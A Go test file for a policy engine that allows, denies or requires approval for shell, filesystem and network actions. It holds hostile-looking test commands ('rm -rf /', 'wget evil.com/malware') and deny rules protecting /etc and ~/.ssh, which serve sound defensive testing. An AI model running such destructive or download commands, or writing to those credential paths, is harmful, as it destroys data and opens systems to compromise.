package policy

import (
	"os"
	"strings"
	"testing"
)

func TestGlobMatch(t *testing.T) {
	tests := []struct {
		pattern string
		value   string
		want    bool
	}{
		// Simple wildcards
		{"ls *", "ls -la", true},
		{"rm -rf *", "rm -rf /tmp/data", true},
		{"cat *", "grep foo", false},
		{"sudo *", "sudo apt install vim", true},
		{"sudo *", "nosudo something", false},

		// Double-star (recursive)
		{"./workspace/**", "./workspace/src/main.go", true},
		{"./workspace/**", "./other/file.txt", false},
		{"/tmp/**", "/tmp/deep/nested/file", true},
		{"/etc/**", "/etc/passwd", true},
		{"/etc/**", "/home/user/.bashrc", false},
		{"**", "/anything/at/all", true},

		// Domain matching
		{"*.slack.com", "hooks.slack.com", true},
		{"*.slack.com", "api.slack.com", true},
		{"*.slack.com", "evil.com", false},
		{"api.openai.com", "api.openai.com", true},
		{"api.openai.com", "api.anthropic.com", false},

		// Exact match
		{"ls", "ls", true},
		{"ls", "cat", false},
	}

	for _, tt := range tests {
		t.Run(tt.pattern+"_vs_"+tt.value, func(t *testing.T) {
			got := globMatch(tt.pattern, tt.value)
			if got != tt.want {
				t.Errorf("globMatch(%q, %q) = %v, want %v", tt.pattern, tt.value, got, tt.want)
			}
		})
	}
}

func TestEngineCheck_DenyFirst(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{
				Scope: "shell",
				Deny: []Rule{
					{Pattern: "rm -rf *", Message: "Destructive command blocked"},
				},
				Allow: []Rule{
					{Pattern: "rm -rf *"}, // allow rule should NOT override deny
				},
			},
		},
	}

	engine := NewEngine(pol)
	result := engine.Check(ActionRequest{
		Scope:   "shell",
		Command: "rm -rf /",
	})

	if result.Decision != Deny {
		t.Errorf("expected DENY, got %s", result.Decision)
	}
	if result.Reason != "Destructive command blocked" {
		t.Errorf("unexpected reason: %s", result.Reason)
	}
}

func TestEngineCheck_AllowRule(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{
				Scope: "shell",
				Allow: []Rule{
					{Pattern: "ls *"},
					{Pattern: "cat *"},
					{Pattern: "python *"},
				},
			},
		},
	}

	engine := NewEngine(pol)

	tests := []struct {
		command  string
		expected Decision
	}{
		{"ls -la", Allow},
		{"cat /tmp/file.txt", Allow},
		{"python script.py", Allow},
		{"rm -rf /", Deny},          // default deny — no matching allow
		{"wget evil.com/malware", Deny}, // default deny
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.Check(ActionRequest{
				Scope:   "shell",
				Command: tt.command,
			})
			if result.Decision != tt.expected {
				t.Errorf("Check(%q) = %s, want %s (reason: %s)",
					tt.command, result.Decision, tt.expected, result.Reason)
			}
		})
	}
}

func TestEngineCheck_RequireApproval(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{
				Scope: "shell",
				RequireApproval: []Rule{
					{Pattern: "sudo *"},
				},
				Allow: []Rule{
					{Pattern: "sudo *"}, // allow exists but approval takes precedence
				},
			},
		},
	}

	engine := NewEngine(pol)
	result := engine.Check(ActionRequest{
		Scope:   "shell",
		Command: "sudo apt install vim",
	})

	if result.Decision != RequireApproval {
		t.Errorf("expected REQUIRE_APPROVAL, got %s", result.Decision)
	}
}

func TestEngineCheck_FilesystemScope(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{
				Scope: "filesystem",
				Deny: []Rule{
					{Action: "write", Paths: []string{"/etc/**", "~/.ssh/**"}, Message: "System dir blocked"},
				},
				Allow: []Rule{
					{Action: "read", Paths: []string{"./workspace/**"}},
					{Action: "write", Paths: []string{"./workspace/**"}},
				},
			},
		},
	}

	engine := NewEngine(pol)

	tests := []struct {
		action   string
		path     string
		expected Decision
	}{
		{"read", "./workspace/src/main.go", Allow},
		{"write", "./workspace/output.txt", Allow},
		{"write", "/etc/passwd", Deny},
		{"write", "~/.ssh/authorized_keys", Deny},
		{"read", "/var/log/syslog", Deny}, // default deny — no matching allow
		{"delete", "./workspace/file.txt", Deny}, // no delete rules → default deny
	}

	for _, tt := range tests {
		t.Run(tt.action+"_"+tt.path, func(t *testing.T) {
			result := engine.Check(ActionRequest{
				Scope:  "filesystem",
				Action: tt.action,
				Path:   tt.path,
			})
			if result.Decision != tt.expected {
				t.Errorf("Check(%s, %s) = %s, want %s (reason: %s)",
					tt.action, tt.path, result.Decision, tt.expected, result.Reason)
			}
		})
	}
}

func TestEngineCheck_NetworkScope(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{
				Scope: "network",
				Deny: []Rule{
					{Domain: "*.production.internal", Message: "No prod access"},
				},
				Allow: []Rule{
					{Domain: "api.openai.com"},
					{Domain: "*.slack.com"},
				},
			},
		},
	}

	engine := NewEngine(pol)

	tests := []struct {
		domain   string
		expected Decision
	}{
		{"api.openai.com", Allow},
		{"hooks.slack.com", Allow},
		{"db.production.internal", Deny},
		{"api.production.internal", Deny},
		{"evil.com", Deny}, // default deny
	}

	for _, tt := range tests {
		t.Run(tt.domain, func(t *testing.T) {
			result := engine.Check(ActionRequest{
				Scope:  "network",
				Domain: tt.domain,
			})
			if result.Decision != tt.expected {
				t.Errorf("Check(domain=%s) = %s, want %s (reason: %s)",
					tt.domain, result.Decision, tt.expected, result.Reason)
			}
		})
	}
}

func TestEngineCheck_DefaultDeny(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules:   []RuleSet{}, // no rules at all
	}

	engine := NewEngine(pol)
	result := engine.Check(ActionRequest{
		Scope:   "shell",
		Command: "echo hello",
	})

	if result.Decision != Deny {
		t.Errorf("expected default DENY, got %s", result.Decision)
	}
	if result.Reason != "No matching allow rule (default deny)" {
		t.Errorf("unexpected reason: %s", result.Reason)
	}
}

func TestEngineCheck_CrossScopeIsolation(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{
				Scope: "shell",
				Allow: []Rule{
					{Pattern: "ls *"},
				},
			},
			{
				Scope: "network",
				Allow: []Rule{
					{Domain: "api.openai.com"},
				},
			},
		},
	}

	engine := NewEngine(pol)

	// Shell command should not match network rules
	result := engine.Check(ActionRequest{
		Scope:  "network",
		Domain: "evil.com",
	})
	if result.Decision != Deny {
		t.Errorf("expected DENY for unmatched network domain, got %s", result.Decision)
	}

	// Network domain should not match shell rules
	result = engine.Check(ActionRequest{
		Scope:   "shell",
		Command: "wget evil.com",
	})
	if result.Decision != Deny {
		t.Errorf("expected DENY for unmatched shell command, got %s", result.Decision)
	}
}

func TestEngineUpdatePolicy(t *testing.T) {
	pol1 := &Policy{
		Version: "1",
		Name:    "v1",
		Rules: []RuleSet{
			{
				Scope: "shell",
				Deny:  []Rule{{Pattern: "rm *", Message: "blocked in v1"}},
			},
		},
	}

	pol2 := &Policy{
		Version: "1",
		Name:    "v2",
		Rules: []RuleSet{
			{
				Scope: "shell",
				Allow: []Rule{{Pattern: "rm *"}},
			},
		},
	}

	engine := NewEngine(pol1)

	// Should be denied under v1
	result := engine.Check(ActionRequest{Scope: "shell", Command: "rm file.txt"})
	if result.Decision != Deny {
		t.Errorf("v1: expected DENY, got %s", result.Decision)
	}

	// Hot-swap to v2
	engine.UpdatePolicy(pol2)

	// Should be allowed under v2
	result = engine.Check(ActionRequest{Scope: "shell", Command: "rm file.txt"})
	if result.Decision != Allow {
		t.Errorf("v2: expected ALLOW, got %s", result.Decision)
	}
}

func TestPolicyRuleCount(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{
				Scope: "shell",
				Allow: []Rule{{Pattern: "a"}, {Pattern: "b"}},
				Deny:  []Rule{{Pattern: "c"}},
				RequireApproval: []Rule{{Pattern: "d"}},
			},
			{
				Scope: "network",
				Allow: []Rule{{Domain: "e"}},
			},
		},
	}

	if got := pol.RuleCount(); got != 5 {
		t.Errorf("RuleCount() = %d, want 5", got)
	}
}

func TestPolicyScopeCount(t *testing.T) {
	pol := &Policy{
		Version: "1",
		Name:    "test",
		Rules: []RuleSet{
			{Scope: "shell"},
			{Scope: "network"},
			{Scope: "filesystem"},
		},
	}

	if got := pol.ScopeCount(); got != 3 {
		t.Errorf("ScopeCount() = %d, want 3", got)
	}
}

func TestLoadFromFile_Invalid(t *testing.T) {
	// Non-existent file
	_, err := LoadFromFile("/tmp/nonexistent_policy_file.yaml")
	if err == nil {
		t.Error("expected error for non-existent file")
	}
}

func TestLoadFromFile_RejectsInvalidRedactionPattern(t *testing.T) {
	dir := t.TempDir()
	path := dir + "/policy.yaml"
	yaml := `version: "1"
name: test
notifications:
  redaction:
    extra_patterns:
      - "[unclosed"
`
	if err := os.WriteFile(path, []byte(yaml), 0600); err != nil {
		t.Fatalf("write: %v", err)
	}
	_, err := LoadFromFile(path)
	if err == nil {
		t.Fatal("expected error for invalid regex in extra_patterns")
	}
	if !strings.Contains(err.Error(), "extra_patterns") {
		t.Errorf("error should mention extra_patterns, got: %v", err)
	}
}

func TestLoadFromFile_AcceptsValidRedactionPattern(t *testing.T) {
	dir := t.TempDir()
	path := dir + "/policy.yaml"
	yaml := `version: "1"
name: test
notifications:
  redaction:
    extra_patterns:
      - "ACME_[A-Z0-9]{12}"
      - "(?i)internal_secret"
`
	if err := os.WriteFile(path, []byte(yaml), 0600); err != nil {
		t.Fatalf("write: %v", err)
	}
	pol, err := LoadFromFile(path)
	if err != nil {
		t.Fatalf("valid extras should load, got: %v", err)
	}
	if len(pol.Notifications.Redaction.ExtraPatterns) != 2 {
		t.Errorf("expected 2 extra patterns, got %d", len(pol.Notifications.Redaction.ExtraPatterns))
	}
}
